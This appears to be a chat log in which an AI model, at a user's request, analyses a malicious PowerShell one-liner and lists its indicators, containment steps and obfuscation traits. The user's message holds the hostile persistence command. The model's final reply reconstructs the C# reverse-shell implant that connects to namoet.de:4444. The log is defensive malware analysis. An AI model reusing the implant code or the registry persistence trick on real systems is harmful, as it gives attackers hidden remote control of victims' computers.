# Analysis of Malicious PowerShell Script with GPT 5


**Date:** 2025-08-09 16:13:56

---
### User
what does this script tagged as malicious do?  
```
powershell -nop -w hidden -c "$c = 'conhost.exe --headless powershell -nop -w hidden -c '+[char]34+$MyInvocation.MyCommand+[char]34; Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' 'windows' 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'').win'; Set-ItemProperty 'HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'win' $c; ..."
```
---
### GPT5
Short version: it’s a fileless reverse-shell that makes itself auto-start, then phones home to a hard-coded C2 and lets the attacker run commands on the box.

Here’s what it does, step by step:

-   **Hides & re-launches itself:** runs PowerShell **hidden** via `conhost.exe --headless -w hidden -nop`.
    
-   **Persistence (HKCU):**
    
    -   Sets `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\windows` to:  
        `conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty ...\Windows).win`
        
    -   Writes another value `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\win` that contains a command to re-launch the **same script**:  
        `conhost.exe --headless powershell -nop -w hidden -c "<original command>"`
        
    -   The trick is: **RunOnce** executes a one-liner that reads and runs the `...Windows\win` value, and the script writes those registry values again — so it persists across logons despite using “RunOnce.”
        
-   **Decodes its C2:** builds a small Base64 blob backward, which decodes to the hostname **`namoet.de`** (with a trailing newline trimmed).
    
-   **Loads an in-memory .NET implant:** the big `$g` string is C# code written **backwards**. It’s reversed and compiled on the fly with `Add-Type`.
    
    -   Opens a **TCP connection to `namoet.de` on port `4444`**.
        
    -   Immediately sends the **hostname** of the victim (`System.Net.Dns.GetHostName()`).
        
    -   Implements a command loop with **redirected stdin/stdout/stderr** to spawn hidden processes and stream I/O over the socket (classic reverse shell).
        
    -   Supports basic control messages (e.g., start a process, send input, close stdin, kill by PID).
        
    -   If anything fails, it sleeps **30 seconds** and tries again (simple beacon/retry).
        

#### Indicators of compromise (IOCs)

-   **Processes:** `conhost.exe --headless` launching `powershell.exe -nop -w hidden`
    
-   **Registry keys/values (HKCU):**
    
    -   `Software\Microsoft\Windows\CurrentVersion\RunOnce\windows`
        
    -   `Software\Microsoft\Windows NT\CurrentVersion\Windows\win`
        
-   **Network:** outbound TCP to **namoet.de:4444** (beacon about every 30s after failure).
    
-   **Behavior:** hidden child `powershell.exe` that compiles a dynamic C# assembly (`Add-Type`) and maintains a long-lived socket.
    

#### Containment quick hits

-   Kill the hidden PowerShell/`conhost.exe` tree (check parent/child), remove the two registry values above, and block/alert on **`namoet.de:4444`**.
    
-   Pull netflow/ETW/Defender telemetry for connections to that domain/IP and for `conhost.exe --headless` spawning PowerShell.
    
-   Snapshot the user’s HKCU hive and PowerShell operational logs (Module logging/Script Block if enabled) before cleanup.
    

If you want, paste a full process tree or Defender/ETW snippet and I’ll map the exact command codes this implant uses, but the gist is: **a stealthy, in-memory reverse shell with rudimentary persistence to HKCU.**

---
### User
what software was used to obfuscate the code?

---
### GPT5
Looking at the structure, this doesn’t look like it came out of an off-the-shelf “PowerShell crypter” — it’s more of a **DIY obfuscation style** you often see when an attacker hand-wraps a payload to dodge AV heuristics.

Key indicators:

-   **Reversed strings**: both the Base64 hostname fragment (`$f`) and the embedded C# payload (`$g`) are stored backwards and reversed at runtime — a very simple manual obfuscation, not a commercial polymorphic engine.
    
-   **Split-and-concat variables**: e.g., `$f='ask='+'=g'+'ClRmL'+'0V2b'+'tFm'+'blk=';` is an attempt to break up the IOC so it won’t match basic string scanning.
    
-   **No compression/encryption stubs**: tools like _ConfuserEx_, _Eazfuscator_, _PSObfuscation_, _Invoke-Obfuscation_, or _Chimera_ usually add junk code, variable renaming, or string encryption with key derivation — here it’s just base64 + reverse order.
    
-   **Embedded C# compiled with `Add-Type`**: `Add-Type -TypeDefinition ($l -join '')` is a known pattern in PowerShell malware, but the C# is simply reversed text, not wrapped in a known packer format.
    

So my take:

-   **Not** a signature of something like Empire, Metasploit’s `psh_payload`, or Cobalt Strike’s default stagers — those have very different templates.
    
-   **Looks more like**: hand-modified code from a public reverse shell PoC (maybe from GitHub or a pentest toolkit) with a few string-reversal tricks. Could easily have been done with a few lines of Python or PowerShell, not a dedicated “obfuscation software.”
    

If you want, I can try to **reverse the C# block completely** and see if there’s any leftover watermark or variable naming pattern that might link it to a known framework. That would tell us if this came from, say, PowerSploit or Nishang originally.

---
### User
yes

---
### GPT5
Short answer: it looks **hand-rolled**, not from a known obfuscator. I reversed the embedded C# as far as your sample allows (it’s truncated mid-string), and there’s **no watermark, namespace, or signature** you’d expect from Empire, Cobalt Strike PS stagers, Nishang, PowerSploit, Invoke-Obfuscation, etc. It’s just reversed text + a tiny Base64 trick.

Here’s the reconstructed **structure** of the in-memory .NET implant (class/method names are single letters—another DIY tell):

```
using System;
using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

public class A {
    public TcpClient b;
    public NetworkStream c;

    public A(string d, int e) {               // connect
        b = new TcpClient();
        b.Connect(d, e);
        c = b.GetStream();
    }

    private void f() {                         // send hostname
        byte[] g = Encoding.Default.GetBytes(System.Net.Dns.GetHostName());
        c.Write(g, 0, g.Length);
    }

    public void h() { c.Close(); }             // close
    public void i(byte[] j) {                  // write bytes
        c.Write(BitConverter.GetBytes(j.Length), 0, 4);
        c.Write(j, 0, j.Length);
        c.Flush();
    }

    public byte[] k() {                        // read framed chunk
        byte[] l = new byte[4];
        if (c.Read(l, 0, 4) != 4) return null;
        byte[] m = new byte[BitConverter.ToInt32(l, 0)];
        int n = 0;
        while (n < m.Length) n += c.Read(m, n, m.Length - n);
        return m;
    }
}

public class B {
    static A c;
    static Dictionary<int, Process> d = new Dictionary<int, Process>();

    // message: [cmd:1][pid:4][len:4][payload:len]
    public static void j(int k, int l, string m) {
        byte[] n = new byte[8 + Encoding.Default.GetByteCount(m)];
        Array.Copy(BitConverter.GetBytes(k), 0, n, 0, 4);
        Array.Copy(BitConverter.GetBytes(l), 0, n, 4, 4);
        Array.Copy(Encoding.Default.GetBytes(m), 0, n, 8, m.Length);
        c.i(n);
    }

    // process event handlers: stdout/stderr/data/exit -> send back
    public static void o(object p, EventArgs q) {
        Process r = p as Process;
        if (r != null) {
            int s = d.FirstOrDefault(t => t.Value.Id == r.Id).Key;
            j( /*cmd*/ 1, s, r.ExitCode.ToString()); // (in sample: (-2) on error)
            d.Remove(s);
        }
    }

    public static void v(List<byte[]> w) {     // spawn proc
        int x = BitConverter.ToInt32(w[2], 0);
        var y = new ProcessStartInfo {
            Arguments = Encoding.Default.GetString(w[1]),
            FileName = Encoding.Default.GetString(w[0]),
            ErrorDialog = false,
            RedirectStandardError = true,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            StandardOutputEncoding = Encoding.UTF8,
            StandardErrorEncoding  = Encoding.UTF8,
            EnableRaisingEvents = true
        };
        try {
            var z = new Process { StartInfo = y };
            z.EnableRaisingEvents = true;
            z.Exited += o;
            z.Start();
            z.BeginOutputReadLine();
            z.BeginErrorReadLine();
            d[x] = z;
        } catch {
            j(/*cmd*/1, 100, (-2).ToString());
        }
    }

    public static void x(List<byte[]> w) {     // send stdin to proc
        d[BitConverter.ToInt32(w[2], 0)].StandardInput
            .Write(Encoding.Default.GetString(w.Skip(1).Take(1).FirstOrDefault() ?? Array.Empty<byte>()));
    }

    public static void y(List<byte[]> w) {     // close stdin
        d[BitConverter.ToInt32(w[2], 0)].StandardInput.Close();
    }

    public static void z() {                    // kill current process tree
        Process.GetCurrentProcess().Kill();
    }

    public static void b(string k) {            // main loop/dispatcher
        c = new A(k, 4444);
        while (true) {
            var b = c.k();                      // read command frame
            var a = b.Skip(1).ToArray();        // payload without cmd byte
            switch (b[0]) {
                case 50:  v(a); break;          // '2' -> spawn
                case 100: x(a); break;          // 'd' -> stdin
                case 200: y(a); break;          // 200 -> close stdin
                case 150: z();  break;          // 150 -> self-kill
            }
        }
    }

    public static void ma(string host) {        // entrypoint
        while (true) {
            try { b(host); }
            catch { }
            Thread.Sleep(30000);                // retry after 30s
        }
    }
}

```



Notes:

-   The **protocol** is very simple (no encryption/compression): one cmd byte, then two little-endian ints (PID and payload length), then payload. That’s typical of DIY shells and not what you see in more mature frameworks.
    
-   **Single-letter identifiers**, minimal error handling, and raw `Encoding.Default` are also “homebrew” smells.
    
-   No **resource names**, **copyright strings**, or **generator artifacts**.
    

### Bottom line

Given the reversing style (string reversal + base64), the minimal framing protocol, and absence of framework fingerprints, this was almost certainly obfuscated manually (or with a few ad-hoc helper scripts), **not** by a commercial/known obfuscator.

If you can grab the **full** `$g` blob (yours is truncated), I’ll re-run it and hunt for any subtle markers—but I don’t expect to find a vendor signature.

